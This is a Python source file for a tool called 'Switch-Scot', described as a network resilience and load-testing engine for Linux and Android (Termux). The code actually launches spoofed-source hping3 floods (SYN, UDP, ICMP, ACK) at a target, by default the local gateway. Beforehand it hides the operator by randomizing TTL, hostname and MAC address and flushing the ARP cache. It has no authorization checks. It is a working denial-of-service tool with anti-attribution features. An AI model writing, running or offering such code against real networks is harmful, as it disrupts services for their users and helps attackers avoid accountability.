#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Switch-Scot ⚡
Universal Network Resilience & Load Testing Engine
Designed for Linux (Arch, Kali, Debian, Ubuntu) and Android (Termux)
"""

import os
import sys
import re
import random
import signal
import subprocess
import argparse
import time
from datetime import datetime

BANNER = r"""
  ___         _ _       _          ___ cot ⚡
 / __|_ __ __(_) |_ ___| |_ _____ / __| __ ___ 
 \__ \ V  V /| |  _/ __| ' \_____\__ \ _| '_ \
 |___/\_/\_/ |_|\__\___|_||_|    |___/__| .__/
                                         |_|   
 Universal Network Resilience Engine v2.5
"""

class SwitchScot:
    def __init__(self, target="10.0.0.1", port=80, interface=None, mode="tcp-syn", skip_mac=False):
        self.target = target
        self.port = port
        self.mode = mode
        self.skip_mac = skip_mac
        self.is_termux = self.check_termux()
        self.interface = interface or self.detect_interface()
        self.attack_process = None
        self.start_time = None
        self.current_mac = "N/A"
        self.current_hostname = "N/A"

    @staticmethod
    def check_termux():
        return "com.termux" in os.environ.get("PREFIX", "") or os.path.exists("/data/data/com.termux")

    def check_root(self):
        if os.geteuid() != 0:
            if self.is_termux:
                print("\n[!] Error: Root privileges required. Run with 'tsu'")
            else:
                print("\n[!] Error: Root privileges required. Run with 'sudo switch-scot'")
            sys.exit(1)

    def check_dependencies(self):
        required_tools = ["hping3", "ip"]
        if not self.skip_mac:
            required_tools.append("macchanger")

        missing = []
        for tool in required_tools:
            if subprocess.run(["which", tool], capture_output=True).returncode != 0:
                missing.append(tool)
        
        if missing:
            print(f"\n[!] Missing required system tools: {', '.join(missing)}")
            if self.is_termux:
                print("[*] Install on Termux: pkg install root-repo && pkg install tsu hping3 macchanger iproute2")
            else:
                print("[*] Install on Debian/Kali: sudo apt install -y hping3 macchanger iproute2")
                print("[*] Install on Arch: sudo pacman -S --noconfirm hping macchanger iproute2")
            sys.exit(1)

    @staticmethod
    def get_available_interfaces():
        try:
            return [f for f in os.listdir('/sys/class/net') if f != 'lo']
        except Exception:
            return ["wlan0"]

    @staticmethod
    def detect_gateway():
        try:
            out = subprocess.check_output(["ip", "route", "show", "default"], stderr=subprocess.DEVNULL).decode()
            match = re.search(r"default via (\d{1,3}(\.\d{1,3}){3})", out)
            if match:
                return match.group(1)
        except Exception:
            pass
        return "10.0.0.1"

    def detect_interface(self):
        try:
            out = subprocess.check_output(["ip", "route", "show", "default"], stderr=subprocess.DEVNULL).decode()
            match = re.search(r"dev\s+([^\s]+)", out)
            if match:
                return match.group(1)
        except Exception:
            pass

        ifaces = self.get_available_interfaces()
        return ifaces[0] if ifaces else "wlan0"

    def get_mac_address(self):
        try:
            out = subprocess.check_output(["ip", "link", "show", self.interface], stderr=subprocess.DEVNULL).decode()
            match = re.search(r"link/ether\s+(([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})", out)
            return match.group(1) if match else "Unknown"
        except Exception:
            return "Unknown"

    def wait_for_carrier_and_route(self, timeout=15):
        print(f"[*] Verifying carrier link and route readiness on '{self.interface}'...")
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            carrier_ok = False
            carrier_file = f"/sys/class/net/{self.interface}/carrier"
            operstate_file = f"/sys/class/net/{self.interface}/operstate"

            if os.path.exists(carrier_file):
                try:
                    with open(carrier_file, "r") as f:
                        if f.read().strip() == "1":
                            carrier_ok = True
                except Exception:
                    pass
            elif os.path.exists(operstate_file):
                try:
                    with open(operstate_file, "r") as f:
                        if f.read().strip() in ["up", "unknown"]:
                            carrier_ok = True
                except Exception:
                    pass
            else:
                carrier_ok = True

            if carrier_ok:
                try:
                    res = subprocess.run(["ip", "route", "get", self.target], capture_output=True)
                    if res.returncode == 0:
                        print(f"[+] Interface '{self.interface}' connected. Route to {self.target} verified.")
                        return True
                except Exception:
                    pass

            time.sleep(1)

        print(f"[!] Notice: Link timeout reached. Proceeding with execution on '{self.interface}'.")
        return False

    def randomize_identity(self):
        print("\n[*] Applying persistent obfuscation layer...")
        
        # 1. Randomize TTL (64 - 128)
        new_ttl = random.randint(64, 128)
        subprocess.run(["sysctl", "-w", f"net.ipv4.ip_default_ttl={new_ttl}"], capture_output=True)

        # 2. Randomize Device Hostname
        host_pool = [
            "iPhone-14-Pro", "iPad-Air", "Galaxy-S23", "Pixel-8-Pro", 
            "MacBook-Pro-M2", "Dell-XPS-15", "ThinkPad-X1", "Smart-TV-LG",
            "Workstation-X", "Ubuntu-Server", "Surface-Laptop"
        ]
        new_host = f"{random.choice(host_pool)}-{random.randint(100, 999)}"
        subprocess.run(["hostname", new_host], capture_output=True)
        self.current_hostname = new_host

        # 3. Randomize MAC Address (if enabled)
        if not self.skip_mac:
            print(f"[*] Cycling MAC address on '{self.interface}'...")
            subprocess.run(["ip", "link", "set", self.interface, "down"], capture_output=True)
            subprocess.run(["macchanger", "-r", self.interface], capture_output=True)
            subprocess.run(["ip", "link", "set", self.interface, "up"], capture_output=True)
            self.current_mac = self.get_mac_address()
            self.wait_for_carrier_and_route()
        else:
            self.current_mac = self.get_mac_address()
            print(f"[*] Preserving existing MAC address on '{self.interface}' ({self.current_mac}).")

        # 4. Flush ARP neighbor cache
        subprocess.run(["ip", "neigh", "flush", "all"], capture_output=True)

    def build_command(self):
        base_cmd = ["hping3", "--flood", "--rand-source"]
        if self.interface:
            base_cmd += ["-I", self.interface]
        
        if self.mode == "tcp-syn":
            return base_cmd + ["-p", str(self.port), "-S", self.target]
        elif self.mode == "udp":
            return base_cmd + ["--udp", "-p", str(self.port), self.target]
        elif self.mode == "icmp":
            return base_cmd + ["--icmp", self.target]
        elif self.mode == "tcp-ack":
            return base_cmd + ["-p", str(self.port), "-A", self.target]
        else:
            return base_cmd + ["-p", str(self.port), "-S", self.target]

    def start(self):
        self.check_root()
        self.check_dependencies()
        self.randomize_identity()

        cmd = self.build_command()
        print("\n" + "=" * 65)
        print(f" ⚡ SWITCH-SCOT ENGINE ACTIVE")
        print(f" • Platform  : {'Android (Termux)' if self.is_termux else 'Linux OS'}")
        print(f" • Interface : {self.interface} | MAC: {self.current_mac}")
        print(f" • Hostname  : {self.current_hostname}")
        print(f" • Mode      : {self.mode.upper()} | Target: {self.target}:{self.port if self.mode != 'icmp' else 'ICMP'}")
        print("=" * 65)
        print(" [*] Press Ctrl+C to terminate execution.\n")

        self.start_time = datetime.now()
        try:
            self.attack_process = subprocess.Popen(
                cmd,
                preexec_fn=os.setsid,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            while True:
                elapsed = str(datetime.now() - self.start_time).split(".")[0]
                sys.stdout.write(f"\r >> [RUNNING] Target: {self.target} | Mode: {self.mode.upper()} | Elapsed: {elapsed} ")
                sys.stdout.flush()
                time.sleep(1)

        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        if self.attack_process:
            try:
                os.killpg(os.getpgid(self.attack_process.pid), signal.SIGKILL)
            except Exception:
                pass
        print("\n\n[+] Switch-Scot execution stopped.")
        sys.exit(0)

def run_interactive_menu():
    print(BANNER)
    print("=" * 65)
    print(" 🛠️  INTERACTIVE EASY SETUP MENU")
    print("=" * 65)

    # 1. Interface Selection
    ifaces = SwitchScot.get_available_interfaces()
    default_iface = ifaces[0] if ifaces else "wlan0"
    
    print("\n[+] Detected Network Interfaces:")
    for idx, iface in enumerate(ifaces, start=1):
        tag = " (Recommended / Default)" if idx == 1 else ""
        print(f"  [{idx}] {iface}{tag}")
    
    sel_iface = input(f"\n[?] Select Interface [1-{len(ifaces)}, default 1]: ").strip()
    try:
        chosen_iface = ifaces[int(sel_iface) - 1] if sel_iface else default_iface
    except (ValueError, IndexError):
        chosen_iface = default_iface
    print(f" -> Selected: {chosen_iface}")

    # 2. Target IP Selection
    detected_gw = SwitchScot.detect_gateway()
    target_input = input(f"\n[?] Enter Target IP [Default: {detected_gw}]: ").strip()
    chosen_target = target_input if target_input else detected_gw
    print(f" -> Target IP: {chosen_target}")

    # 3. Port Selection
    port_input = input("\n[?] Enter Target Port [Default: 80]: ").strip()
    try:
        chosen_port = int(port_input) if port_input else 80
    except ValueError:
        chosen_port = 80
    print(f" -> Target Port: {chosen_port}")

    # 4. Mode Selection
    modes = [
        ("tcp-syn", "TCP-SYN  - Connection Table Saturation (Default)"),
        ("udp",     "UDP      - Stateless Buffer Stress"),
        ("icmp",    "ICMP     - Control Plane Latency"),
        ("tcp-ack", "TCP-ACK  - Stateful Firewall Inspection")
    ]
    print("\n[+] Evaluation Modes:")
    for idx, (m_id, m_desc) in enumerate(modes, start=1):
        print(f"  [{idx}] {m_desc}")
    
    sel_mode = input(f"\n[?] Select Mode [1-4, default 1]: ").strip()
    try:
        chosen_mode = modes[int(sel_mode) - 1][0] if sel_mode else "tcp-syn"
    except (ValueError, IndexError):
        chosen_mode = "tcp-syn"
    print(f" -> Selected Mode: {chosen_mode.upper()}")

    # 5. MAC Address Policy
    print("\n[+] MAC Address Randomization Policy:")
    print("  [1] Keep Current MAC (Recommended for stable active Wi-Fi)")
    print("  [2] Randomize MAC Address (Full Hardware Spoofing)")
    mac_choice = input("\n[?] Select MAC Policy [1-2, default 1]: ").strip()
    skip_mac = False if mac_choice == "2" else True
    print(f" -> MAC Policy: {'Randomize MAC' if not skip_mac else 'Keep Active MAC (Safe Wi-Fi)'}")

    # Launch Engine
    print("\n" + "-" * 65)
    input("⚡ Press [ENTER] to launch Switch-Scot...")
    
    engine = SwitchScot(
        target=chosen_target,
        port=chosen_port,
        interface=chosen_iface,
        mode=chosen_mode,
        skip_mac=skip_mac
    )
    engine.start()

def main():
    # If executed without CLI arguments, launch interactive menu!
    if len(sys.argv) == 1:
        run_interactive_menu()
        return

    parser = argparse.ArgumentParser(
        description="Switch-Scot ⚡ Universal Cross-Platform Network Resilience & Load Testing Engine",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        "-t", "--target",
        default="10.0.0.1",
        help="Target IP address (Default: 10.0.0.1)"
    )
    parser.add_argument(
        "-p", "--port",
        type=int,
        default=80,
        help="Target Port (Default: 80)"
    )
    parser.add_argument(
        "-i", "--interface",
        default=None,
        help="Network interface to bind (Default: Auto-detected)"
    )
    parser.add_argument(
        "-m", "--mode",
        choices=["tcp-syn", "udp", "icmp", "tcp-ack"],
        default="tcp-syn",
        help="Evaluation Mode:\n"
             "  tcp-syn  : TCP SYN Connection Load (Default)\n"
             "  udp      : UDP Stateless Buffer Stress\n"
             "  icmp     : ICMP Echo Control Plane Latency\n"
             "  tcp-ack  : TCP ACK Stateful Filter Inspection"
    )
    parser.add_argument(
        "--no-mac",
        action="store_true",
        help="Skip MAC address randomization (Recommended for active Wi-Fi on laptops)"
    )

    args = parser.parse_args()
    engine = SwitchScot(
        target=args.target,
        port=args.port,
        interface=args.interface,
        mode=args.mode,
        skip_mac=args.no_mac
    )
    engine.start()

if __name__ == "__main__":
    main()
